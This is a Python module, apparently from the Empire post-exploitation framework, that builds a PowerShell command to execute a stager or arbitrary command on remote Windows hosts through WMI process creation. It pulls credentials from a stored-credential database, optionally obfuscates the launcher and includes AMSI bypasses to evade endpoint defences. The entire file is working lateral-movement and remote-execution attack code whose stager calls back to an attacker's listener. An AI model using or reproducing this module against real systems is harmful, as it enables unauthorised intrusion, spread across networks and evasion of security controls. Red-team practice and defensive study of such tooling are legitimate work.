from __future__ import print_function

from builtins import object
from builtins import str

from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-WMI',

            'Author': ['@harmj0y'],

            'Description': ('Executes a stager on remote hosts using WMI.'),

            'Software': '',

            'Techniques': ['T1047'],

            'Background' : False,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ComputerName' : {
                'Description'   :   'Host[s] to execute the stager on, comma separated.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Command' : {
                'Description'   :   'Custom command to run.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False'
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'AMSIBypass': {
                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'True'
            },
            'AMSIBypass2': {
                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'False'
            },
            'UserName' : {
                'Description'   :   '[domain\]username to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password to use to execute command.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # Set booleans to false by default
        Obfuscate = False
        AMSIBypass = False
        AMSIBypass2 = False

        listenerName = self.options['Listener']['Value']
        command = self.options['Command']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        userName = self.options['UserName']['Value']
        password = self.options['Password']['Value']
        if (self.options['Obfuscate']['Value']).lower() == 'true':
            Obfuscate = True
        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
        if (self.options['AMSIBypass']['Value']).lower() == 'true':
            AMSIBypass = True
        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
            AMSIBypass2 = True

        script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""


        # Only "Command" or "Listener" but not both
        if (listenerName == "" and command  == ""):
          print(helpers.color("[!] Listener or Command required"))
          return ""
        if (listenerName and command):
          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
          return ""

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":

            if not self.mainMenu.credentials.is_credential_valid(credID):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            else:
                self.options["UserName"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = password


        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listenerName))
            return ""

        elif listenerName:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)

            if launcher == "":
                return ""
            else:
                stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher

        else:
                Cmd = command.replace('"','`"').replace('$','`$')
                stagerCode = Cmd
                print(helpers.color("[*] Running command:  " + command))

        # build the WMI execution string
        computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""

        script += " -ComputerName @("+computerNames+")"
        script += " -ArgumentList \"" + stagerCode + "\""

        # if we're supplying alternate user credentials
        if userName != '':
            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"

            script += ";'Invoke-Wmi executed on " +computerNames +"'"

        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        script = helpers.keyword_obfuscation(script)

        return script
